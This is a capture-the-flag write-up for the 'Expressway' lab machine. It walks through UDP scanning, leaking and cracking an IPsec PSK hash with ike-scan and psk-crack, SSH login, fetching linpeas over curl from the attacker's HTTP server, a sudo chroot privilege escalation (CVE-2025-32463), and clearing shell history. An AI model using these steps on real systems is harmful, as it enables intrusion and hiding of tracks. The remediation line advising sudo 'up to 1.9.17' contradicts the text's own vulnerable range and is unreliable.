# Expressway

**Machine Name**: Expressway

**Machine OS**: Linux

**Difficulty**: Easy

## Introduction

Given network with vague service, limited TCP service and provide more information on the UDP side. The network use VPN to connect and configure, leaked it hash through allowed aggressive scan on **IKE**. Upon gaining access, the sudo version is vulnerable that allows attacker to escalate their privilege and having root access to the system.

## Information Gathering

Initial information that we got is the IP **10.10.11.87** with no capability to do curl to check for any redirect HTTP service. To get more information about the network, do network scanning using tool **nmap**.

### TCP Scan

Run TCP Scan to know any potential port open in TCP connection. The result only gave us an SSH in port 22. Something looks like wrong and try to scan more using other protocol.

```
nmap -sT -T4 10.10.11.87 -vvv 
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
```



### UDP scan

Use UDP Scan to know any UDP port and service that may open up. Using fast can is recommended because the server took to long to scan.

```
nmap -sU -F -T4 -vvv [victim machine IP]
```

* -sU : UDP Scan
* -F : fast scan
* -T4: speed of scan, in scale of 1-5, if the number set too high it might alert IDS/officer

from here, we gathered the potential open ports is:

```
PORT      STATE         SERVICE
7/udp     open|filtered echo            
67/udp    open|filtered dhcps           
68/udp    open|filtered dhcpc           
69/udp    open|filtered tftp            
135/udp   open|filtered msrpc           
500/udp   open          isakmp          
998/udp   open|filtered puparp          
1029/udp  open|filtered solid-mux       
4500/udp  open|filtered nat-t-ike       
```

One port clearly open is **isakmp (Internet Security Association and Key Management Protocol),** a protocol that manage cryptographic key in an internet environment.  The other potential service is **TFTP** (**Trivial File Transfer Protocol**), a service that provide simple transfer file and **NAT-T-IKE,** or NAT Traversal that used to negotiate with Internet Key Exchange (IKE) in VPN connection with IPsec.



### Using **ike-scan**

**ike-scan** is a tool to discover and fingerprint IKE hosts for the use of IPsec VPN servers.

```
ike-scan -AM 10.10.11.87
```

* -A : aggresive mode will scan and force to provide hash when output to a file (easier to fingerprint and capture data useful for PSK cracking)
* -M : provide multiple lines to make it easier to read

Here what should be noticed is that it returned '**1 returned handshake**' that indicate the server or host accetps Aggressive Mode an will respond to our initial packets. From here we can conclude that the ID identity the expected responder from which is **ike@expressway.htb**. It also provide the **Hash** that we could try to get and crack it in hope it store some credentials to log into SSH as user **ike**.&#x20;

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>



### UDP specific to TFTP

Try to probe the TFTP service as it may store some valuable information to us in hope there is some credentials.

```
nmap -sU -p 69 -v --script=tftp-version.nse [victim machine IP]
```

```
PORT STATE SERVICE 
69/udp open tftp 
| tftp-version: 
| cpe: 
| cpe:/a:netkit:netkit 
| cpe:/a:lefebvre:atftpd 
|_ p: Netkit tftpd or atftpd
```

#### enum/brute force directory

```
nmap -v -sU -p 69 --script=tftp-enum [victim machine IP]
```

```
PORT STATE SERVICE 
69/udp open tftp 
| tftp-enum: 
|_ ciscortr.cfg
```

In TFTP there is a file named **ciscortr.cfg** that contain potential cisco config that may be useful later.

## Enumeration

**ciscortr.cfg** contain cisco configuration, notice that the key is need a secret-password to connect to the VPN. This file is not that useful and I can only gathered some interesting part and its domain.

```
...
no service password-encryption

!

hostname expressway
...

crypto isakmp client configuration group rtr-remote

	key secret-password

	dns 208.67.222.222

	domain expressway.htb

	pool dynpool

!
```

### Extract Hash and Decrypt&#x20;

Extract the Hash that come when using **ike-scan** and output it as the file name .txt

```
ike-scan -A --pskcrack=[file name].txt [victim machine IP]
```



crack the hash using **psk-crack** tool to get the **PreShared Key** (PSK)

```
 psk-crack [file name].txt -d /usr/share/wordlists/rockyou.txt
```

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Try to use the key to log into SSH that opened with username **ike@expressway.htb**

## Gaining Access

Here we successful to log in using SSH with user **ike** and password that we got from cracked the PSK hash.

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Next step is to enumerate system to seek any potential vulnerable services, packages, miss configuration, or anything else that can lead to escalate the privilege as **root** as main intention.

Information we got from here is the server using Linux, so to enumerate them, I using a tool named **linpeas.sh** that provide useful information about the machine and potential attack vectors (check reference below).

### Setup HTTP Server&#x20;

Setup a python http server to support us to fetch the tool and run in the machine. The port can be customized to anything else as long as it not make a collision with other service that using the same port. Make sure that you run the http server within the same directory as the **linpeas** tool.

```
python3 -m http.server 7000 --bind 0.0.0.0
```

Make sure already download **linpeas.sh,** do fetch from our server to victim machine and run them. It will enumerate all possible potential vulnerability within machine.

```
curl [our attack machine]:7000/linpeas.sh
```

As you can see in the picture below it shows information to help identify potential vulnerability but don't too dependent on the 'legend' that may give valuable information. Try to enumerate _"**one-by-one"**_ from the provided information as it more provide useful information to us than random trying on anything that catch your eyes.

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Upon enumerating, I found out that they use **sudo version 1.9.17**. After researched the sudo version, turned out this version is vulnerable to **CVE-2025-32463** a critical sudo "chroot" that enable privilege escalation via **--chroot** or **-R** option. Based on the information, the flaws affected sudo version **1.9.14** - **1.9.17**.

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>



## Privilege Escalation

I created a new file named **test.sh** with source code from the github below to exploit this vulnerable sudo version and setup the http server from our machine to fetch the file. modify the file so it can be run and run it to get the root user.

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## Clearing Logs

to clear the logs in linux machine, simply use the history command.

```
history -c
```

This only effective if the .bash\_history set to **/dev/null.**

## Remediation

To remediate the following issue, do the following action:

* **Disable aggressive mode** to prevent leaks a hash of PSK.
* **Replace PSK authentication** with certificate-based or EAP methods to prevent brute forcing of the shared secrets.
* **Upgrade to IKEv2** that provide more secure, modern, and supports better cryptography.
* **Use a strong and high-entropy PSK** to make sure resistance from brute-force.
* **update** the **sudo** version up to **1.9.17** to provide a better security and hinder from **CVE-2025-32463.**

## Reference

{% embed url="https://www.upwind.io/feed/cve%E2%80%912025%E2%80%9132463-critical-sudo-chroot-privilege-escalation-flaw" %}

{% embed url="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot" fullWidth="false" %}

{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" %}
